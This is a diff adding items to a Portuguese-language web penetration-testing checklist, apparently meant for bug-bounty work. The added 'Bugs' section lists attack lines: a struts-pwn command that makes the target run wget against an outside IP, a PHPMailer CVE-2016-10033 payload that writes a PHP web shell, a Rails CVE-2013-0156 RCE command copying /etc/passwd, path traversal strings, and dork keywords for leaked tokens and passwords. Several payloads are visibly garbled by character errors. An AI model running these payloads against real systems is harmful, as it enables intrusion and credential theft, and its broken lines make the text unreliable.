@@ -361,6 +361,9 @@ Se você encontrar que WebDav está habilitado mas você não tem as permissões
 * [ ] Adicionar apenas espaços na senha
 * [ ] A taxa limite de tempo de registro
 * [ ] XSS no nome ou email
+* [ ] Payload XSS no cabeçalho User-Agent
+* [ ] Payload XSS durante o registro (insira o payload XSS em esqueci a senha, login, registro para gerar erros)
+* [ ] Use payload XSS como sua senha
 
 
 
@@ -856,6 +859,43 @@ Se você encontrar que WebDav está habilitado mas você não tem as permissões
 * [ ] Referer-Policy
 * [ ] Cache-Control
 * [ ] Expires
+
+
+
+**Bugs**
+
+* [ ] Adicione o cabeçalho em Proxy> Opções - navegue no programa e depois clique em pesquisar e tente encontrar o valor do X-Forwarded-Host para fraude de cache da web
+* [ ] Contrabando de Solicitações HTTP
+* [ ] Aplicar em xhtml
+* [ ] python struts-pwn.py -u [https://site.com/orders.xml](https://site.com/orders.xml) -c "wget [http://ip:1337/test](http://ip:1337/test)" --exploit
+* [ ] Teste para Livro de Código Eletrônico (AAAAAA aaaaaa BBBBB)
+* [ ] CVE-2016-10033: PHPMailer RCE&#x20;
+
+email: "attackerQ127.0.0.1)" -oQ/tmp/ -X/var/wwwj/shell.php root"Q127.0.0.1&#x20;
+
+assunto: \<?php system($\_GET\['c'];?>
+
+* [ ] Altere todas as solicitações para o método TRACE para divulgar ou acessar informações
+* [ ] bic http://company.com -ro (procure por links quebrados)
+* [ ] Teste vhost
+* [ ] Teste por buckets
+* [ ] Verifique Github & Lista de Dorks
+
+(api token username, password, secret,dev,prod,jenkins,config,ssh,ftp, MYSQL. PASSWORD, admin,AWS, bucket,GITHUB TO KEN)
+
+* [ ] Acesse dados configurados incorretamente de uma organização: https://storage.googleapis.com/
+* [ ] Acesse grupos de organizações do grupo sem autorização: https://groups.google.com/a/\<nome\_do\_dominio>
+* [ ] waybackurls site.com
+* [ ] Se está usando Ruby então: Accept: ../../../../../..)..)..|..Jetc/passwd\{{
+* [ ] CVE-2013-0156: Injeção de Objetos Rails: Ruby rails.rce.rb http://site.com 'cp /etc/passwd public/ahsan. txt!([https://gist.githubusercontent.com/postmodern/4499206/raw/a68a6ff8c1f9570a0936503aeb96f6a9fff7121/rails\_rce.rb](https://gist.githubusercontent.com/postmodern/4499206/raw/a68a6ff8c1f9570a0936503aeb96f6a9fff7121/rails\_rce.rb))
+* [ ] CVE-2019-11043 Dica: Se o website for baseado em PHP com NGINX phuip-fpizdam [http://site.com/anyphpfile.php](http://site.com/anyphpfile.php)
+* [ ] Verifique se há injeção crif
+* [ ] Ignorar proteção de redirecionamento aberto
+* [ ] Encontrar chave (Keyfinder)
+* [ ] site: scribd.com "target" (ou você pode usar dorks como "TARGET")
+* [ ] Verifique a verificação do email adminQOsite.com
+* [ ] site.com/home)....4....json (Divulgará todo o conteúdo do diretório inicial + informações confidenciais)
+* [ ] CVE-2019-19781 Citrix NetScaler Directory Traversal : curl -vk —path-as-is https://$TARGET/vpn/../vpns/2>81 | grep “You don't have permission to access /vpns/" >/dev/null && echo “"VULNERABLE: $TARGET" || echo “MITIGATED: $TARGET"
 
 
 
